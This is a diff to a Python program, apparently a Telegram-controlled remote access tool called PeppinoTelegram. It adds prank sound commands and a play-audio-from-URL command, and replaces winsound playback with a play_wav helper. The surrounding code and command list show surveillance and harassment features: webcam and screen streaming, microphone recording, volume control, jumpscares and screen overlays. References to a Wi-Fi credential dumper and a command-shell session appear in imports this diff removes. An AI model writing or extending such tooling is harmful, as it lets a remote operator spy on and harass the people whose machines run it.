@@ -8,7 +8,7 @@ If you lose control of your telegram bot, you could potentially lose the control
 """
 
 
-__version__ = "2.20.1"
+__version__ = "2.21.1"
 
 
 #TELEGRAM
@@ -35,11 +35,6 @@ from moviepy.editor import AudioFileClip, VideoFileClip
 import soundfile as sf
 import sounddevice as sd
 
-try:
-    from winsound import PlaySound, SND_FILENAME, SND_ASYNC
-except ImportError:
-    PlaySound = lambda *args:args
-    SND_ASYNC = SND_FILENAME = None
 
 #MISC
 import sys
@@ -60,6 +55,7 @@ from datetime import datetime
 from tempfile import gettempdir
 from typing import Any, Callable
 from random import choice, randint
+from urllib.request import urlretrieve
 from winotify import audio, Notification
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
@@ -71,12 +67,6 @@ from os.path import join, abspath, isfile, exists, dirname, realpath, split as p
 #UTILS
 import pyngrok
 from utils import *
-from utils import toducky
-from utils import CustomMixer
-from utils import WifiDumper
-from utils import CMDSession
-from utils import HDMIDrownedOverlay
-
 
 def resource_path(relative_path: str) -> str:
     if getattr(sys, 'frozen', False):
@@ -288,7 +278,9 @@ webcamandscreenstreamstop - Stops the webcam and screen stream.
 🔊 Audio & Volume
 urltoast - Shows a url opening windows toast.
 breath - Play breathing sound.
-pss - Play "psst" sound.
+pss - Plays "psst" sound.
+fart - Plays a fart sound.
+knockknock - Plays a knock on a door sound, pretty realistic too.
 microphone - Record mic audio.
 mutevolume - Set computer's volume to 0.
 fullvolume - Set computer's volume to 100.
@@ -296,6 +288,7 @@ setvolume - Set computer's volume level.
 getvolume - Gets the computer's volume level.
 tralalerotralala - Plays italian brainrot.
 mixermenu - Sends a mixer menu.
+playfromurl - Plays an audio from an url. (WAV, MP3, OGG)
 
 😈 Pranks & Visuals
 jumpscare - Show random jumpscare.
@@ -380,23 +373,6 @@ def checkconn() -> bool:
         return True
     except Exception as e:
         return False
-
-#AUDIO CONVERSION
-def wav_to_ogg(filename: str, rmold: bool=False) -> str:
-    data, samplerate = sf.read(filename)
-    new_filepath = filename.replace(".wav", ".ogg")
-    sf.write(new_filepath, data, samplerate, format="OGG", subtype="OPUS")
-    if rmold:
-        remove(filename)
-    return new_filepath
-
-def ogg_to_wav(filename: str, rmold: bool=False) -> str:
-    data, sr = sf.read(filename) 
-    new_filepath = filename.replace(".ogg", ".wav")
-    sf.write(new_filepath, data, sr)
-    if rmold:
-        remove(filename)
-    return new_filepath
 
 #GETTING TOKEN AND CHAT_ID
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
@@ -976,7 +952,10 @@ class PeppinoTelegram:
             "rightclick":self.rightclick,
             "hdmi_drowning_effect":self.wrapper_for_hdmi_overlay,
             "stop_hdmi_drowning_effect":self.hdmiDrownerOverlayPlayer.stop,
+            "fart":self.fart,
+            "knockknock":self.knockknock,
             "nothing":lambda:...,
+            "playfromurl":play_from_url,
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
             "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8),
         }
@@ -1000,13 +979,11 @@ class PeppinoTelegram:
         old = self.audio_mixer.getVolumePercentage()
         if volume:
             self.set_volume(volume)
-        self.__playsound(self.audios[audio])
+        play_wav(self.audios[audio])
         sleep(5)
         if volume:
             self.set_volume(old)
 
-    def __playsound(self, audio: str, separate_thread: bool = True) -> None:
-        PlaySound(audio, (SND_FILENAME|SND_ASYNC) if separate_thread else SND_FILENAME)
 
     def __send_image(self, image_name: str, caption=None) -> bool:
         try:
@@ -1345,7 +1322,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         if showimage:
             imageThread.start()
         if playaudio:
-            self.__playsound(audio)
+            play_wav(audio)
         if showimage:
             imageThread.join()
         self.audio_mixer.setVolumePercentage(old_volume)
@@ -1577,6 +1554,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         buttons = {
             "🔙 Back": "/mainmenu",
             "💨 Breath": "/breath",
+            "💨Fart":"/fart",
+            "🚪Knock Knock":"/knockknock",
             "📢 Pss": "/pss",
             "🔔 Urltoast": "/urltoast",
             "🎙️ Microphone": "/microphone",
@@ -1586,6 +1565,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             "📈 Get volume": "/getvolume",
             "🎶 Tralalero tralala": "/tralalerotralala",
             "🎛️ Mixer menu": "/mixermenu",
+            "🔊🔗 Play from url":"playfromurl"
         }
 
         if self.mainmenu_ref:
@@ -1737,7 +1717,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         with open(filepath, "wb") as f:
             f.write(response.content) 
         new_filepath = ogg_to_wav(filepath, rmold=True)
-        self.__playsound(new_filepath, False)
+        play_wav(new_filepath, False)
         remove(new_filepath)
 
     def parse_command(self, text: str) -> None:
@@ -1867,7 +1847,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             audio_clip = video_clip.audio
             if audio_clip is not None:
                 audio_clip.write_audiofile(temp_audio_file, logger=None)
-                PlaySound(temp_audio_file, SND_FILENAME | SND_ASYNC)
+                play_wav(temp_audio_file)
                 audio_clip.close()
             video_clip.close()
         except:
